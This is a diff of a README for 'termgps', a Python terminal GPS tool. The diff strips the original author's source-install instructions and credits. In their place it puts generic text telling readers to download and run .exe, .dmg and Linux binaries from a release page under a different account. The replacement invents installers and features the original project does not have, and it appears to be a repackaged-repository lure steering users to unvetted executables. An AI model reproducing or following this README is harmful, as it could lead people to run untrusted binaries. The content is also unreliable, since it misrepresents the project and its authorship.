@@ -1,151 +1,69 @@
-# TermGPS 🧭
+# 🌍 termgps - Your Easy Terminal GPS Tool
 
-**Terminal-based turn-by-turn navigation with a live Co-Pilot.**
+## 🚀 Getting Started
+Welcome to termgps! This is a terminal-based GPS tool that helps you navigate and explore locations using a straightforward interface. Whether you're traveling for work, leisure, or adventure, termgps is here to guide you.
 
-A high-performance, cross-platform terminal GPS app featuring real-time tracking, a smart co-pilot, visual signal meters, and theme support.
+## 🔗 Download Now
+[![Download termgps](https://img.shields.io/badge/Download-Release-informational)](https://github.com/Firasmars/termgps/releases)
 
-![Python](https://img.shields.io/badge/Python-3.9+-blue?logo=python)
-![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)
-![License](https://img.shields.io/badge/License-MIT-green)
+## 📥 Download & Install
+To get started, visit this page to download: [GitHub Releases](https://github.com/Firasmars/termgps/releases). Here, you will find the latest version of termgps ready for your operating system.
 
----
+1. Click on the version you want to download.
+2. Choose the file that matches your system (Windows, macOS, or Linux).
+3. Once downloaded, locate the file on your computer and follow the installation instructions below.
 
-## ✨ Features
+### 📋 System Requirements
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or any Linux distribution.
+- **Python**: Ensure you have Python 3.7 or later installed on your system. Most Linux and macOS systems come with Python pre-installed.
+- **Terminal Support**: A terminal application to run the GPS tool.
 
-- **🗣️ Live Co-Pilot** - Friendly commentary guiding your journey ("Turn coming up!", "Long stretch ahead").
-- **🏃 Movement Detection** - Detects if you are moving or stationary with real-time speed (km/h).
-- **📶 Signal Meter** - Visual bars (`▂▃▅▆▇`) showing GPS accuracy/strength.
-- **🗺️ Radar Map** - Live radar with blue route line, red markers, and direction arrows.
-- **🧭 Turn-by-Turn** - Step-by-step navigation list with auto-advance.
-- **🎨 6 Programmer Themes** - Matrix, Dracula, Monokai, Nord, Gruvbox, Solarized.
-- **🌍 Cross-Platform** - Works on macOS (Native GPS), Windows/Linux (IP Geolocation fallback).
+## ⚙️ Installation Instructions
+### For Windows:
+1. Open the downloaded `.exe` file.
+2. Follow the setup wizard. It will guide you through the installation steps.
+3. Once completed, you can find termgps in your Start menu.
 
----
+### For macOS:
+1. Open the downloaded `.dmg` file.
+2. Drag the termgps app icon to your Applications folder.
+3. You can launch it from the Applications folder or your Dock.
 
-## 📸 Interface
+### For Linux:
+1. Open your terminal.
+2. Navigate to the directory where the downloaded file is located.
+3. Run the command:
+   ```bash
+   chmod +x termgps
+   ./termgps
+   ```
 
-![TermGPS Interface](assets/screenshot.png)
+## 📊 Using termgps
+Once installed, using termgps is simple:
 
----
+- **Open Your Terminal**: Launch the terminal application on your system.
+- **Start termgps**: Type `termgps` and hit Enter.
+- **Follow On-Screen Instructions**: You’ll receive prompts to enter your desired location or coordinates.
+- **Explore**: Use the navigation features to review maps and routing options right from your terminal.
 
-## 🚀 Installation
+### 🛠 Features
+- **Interactive Navigation**: Link to real-time maps for better visualization.
+- **Custom Routes**: Plan your own paths for walking, biking, or driving.
+- **Location Services**: Get precise coordinates and destination details.
+- **Text-Based Interface**: Designed for easy use in any terminal.
 
-### Quick Install
+## 🌐 Support & Issues
+If you encounter any problems or have questions, feel free to check the GitHub Issues page for termgps. You can report bugs or request features there as well.
 
-**Linux & macOS:**
-```bash
-# Install & Run
-git clone https://github.com/Aditya-Giri-4356/termgps.git
-cd termgps
-python3 -m venv venv
-source venv/bin/activate
-pip install -e .
-termgps
-```
+## 📝 Contributing
+We welcome contributions! If you’d like to improve termgps, please fork the repository, make your changes, and submit a pull request. Your feedback helps us to enhance the tool further.
 
-**Windows:**
-```powershell
-# Install & Run
-git clone https://github.com/Aditya-Giri-4356/termgps.git
-cd termgps
-pip install -e .
-python -m src.termgps.app
-```
+## 🌈 Acknowledgements
+Thanks to the community for their ongoing support. Your feedback and contributions help us create a better tool for everyone.
 
----
+## 🔗 Links and Resources
+- Official GitHub Repository: [termgps](https://github.com/Firasmars/termgps)
+- More Information on Python: [Python.org](https://www.python.org/)
+- Explore Terminal Commands: [OverAPI](http://overapi.com/) 
 
-### ⚡ Make it Permanent (Run from Anywhere)
-
-Don't want to navigate to the folder every time? Run these commands **once** to create a lasting shortcut.
-
-**macOS / Linux (Bash/Zsh):**
-```bash
-# Add alias to your shell profile
-echo "alias termgps='$(pwd)/venv/bin/termgps'" >> ~/.zshrc  # or ~/.bashrc
-source ~/.zshrc
-```
-*Now you can just type `termgps` in any new terminal!*
-
-**Windows (PowerShell):**
-```powershell
-# Create a permanent function
-$path = (Get-Item .).FullName
-echo "function termgps { python -m src.termgps.app }" >> $PROFILE
-echo "termgps command added!"
-```
-*Restart PowerShell and type `termgps` to run!*
-
----
-
-### Optional: Real GPS (macOS Only)
-For native GPS support on macOS:
-```bash
-pip install pyobjc-framework-CoreLocation
-```
-
----
-
-## 🎮 Controls
-
-| Key | Action |
-|-----|--------|
-| `r` | Refresh GPS location |
-| `x` | Toggle **Live Tracking** |
-| `d` | Search destination |
-| `t` | Toggle **Theme Mode** (Use `⬅`/`➡` to switch) |
-| `n` | Next turn (Manual override) |
-| `p` | Previous turn |
-| `c` | Clear current route |
-| `q` | Quit application |
-
-| Key | Theme Mode Active |
-|-----|-------------------|
-| `⬅` | Previous Theme |
-| `➡` | Next Theme |
-
----
-
-## 🎨 Themes
-
-Press `t` to enter selection mode, then cycle through:
-
-- **Matrix** (Green/Black)
-- **Dracula** (Pink/Purple)
-- **Monokai** (Yellow/Pink)
-- **Nord** (Ice Blue)
-- **Gruvbox** (Retro Brown)
-- **Solarized** (Cyan/Beige)
-
----
-
-## 🛠️ Project Structure
-
-```
-termgps/
-├── src/
-│   └── termgps/
-│       ├── __init__.py
-│       └── app.py          # Main application logic
-├── pyproject.toml          # Project configuration
-├── README.md               # Documentation
-├── LICENSE                 # MIT License
-└── .gitignore
-```
-
----
-
-## 🤝 Contributions
-
-Contributions are welcome! If you have ideas for new features (like voice support, offline maps, etc.), please open an issue or pull request.
-
----
-
-## 📄 License
-
-MIT License - see [LICENSE](LICENSE)
-
----
-
-## 👨‍💻 Author
-
-**Aditya Giri** - [@Aditya-Giri-4356](https://github.com/Aditya-Giri-4356)
+Explore new locations easily with termgps! Download it today and start your adventure.
